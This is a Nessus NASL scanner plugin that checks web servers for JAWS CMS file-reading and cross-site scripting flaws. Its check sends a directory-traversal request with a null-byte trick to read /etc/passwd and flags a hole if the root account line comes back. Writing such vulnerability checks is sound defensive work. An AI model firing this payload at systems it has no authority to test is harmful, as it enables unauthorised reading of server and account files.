#
# (C) Tenable Network Security
#
if(description)
{
 script_id(16198);
 script_cve_id("CVE-2004-2443", "CVE-2004-2444", "CVE-2004-2445");
 script_bugtraq_id(10670); 
 if (defined_func("script_xref")) {
   script_xref(name:"OSVDB", value:"7720");
   script_xref(name:"OSVDB", value:"7721");
   script_xref(name:"OSVDB", value:"7722");
   script_xref(name:"OSVDB", value:"7723");
   script_xref(name:"OSVDB", value:"7724");
 }
 script_version("$Revision: 1.4 $");
 name["english"] = "JAWS Multiple Input Validation Vulnerabilities";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running JAWS, a content management system written
in PHP. 

The remote version of this software is vulnerable to several
vulnerabilities allowing an attacker to read arbitrary files on the
remote server or to perform a cross site scripting attack using the
remote host. 

Solution : Upgrade to the newest version of this software.
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for a file reading flaw in JAWS";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir ( cgi_dirs() )
{
 req = http_get(port:port, item:dir + "/index.php?gadget=../../../../../../etc/passwd%00&path=/etc");
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if ( egrep(pattern:"root:.*:0:[01]:.*:.*:", string:res) )
 {
	 security_hole(port);
	 exit(0);
 }
}
